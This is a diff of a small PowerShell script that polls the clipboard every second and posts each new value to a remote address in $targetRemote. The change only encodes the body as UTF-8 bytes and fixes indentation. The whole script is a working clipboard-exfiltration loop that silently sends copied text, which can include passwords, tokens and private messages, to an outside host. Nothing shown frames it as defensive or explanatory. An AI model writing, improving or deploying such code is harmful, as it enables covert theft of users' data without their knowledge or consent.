@@ -1,13 +1,14 @@
 $previousContent = ""
 
 while ($true) {
-    $currentContent = Get-Clipboard
+  $currentContent = Get-Clipboard
 
     if ($currentContent -ne $previousContent) {
-        Invoke-RestMethod -Uri $targetRemote -Method Post -Body $currentContent
+        $encodeText = [System.Text.Encoding]::UTF8.GetBytes($currentContent)
+        Invoke-RestMethod -Uri $targetRemote -Method Post -Body $encodeText
 
         $previousContent = $currentContent
     }
 
-    Start-Sleep -Seconds 1
+  Start-Sleep -Seconds 1
 }
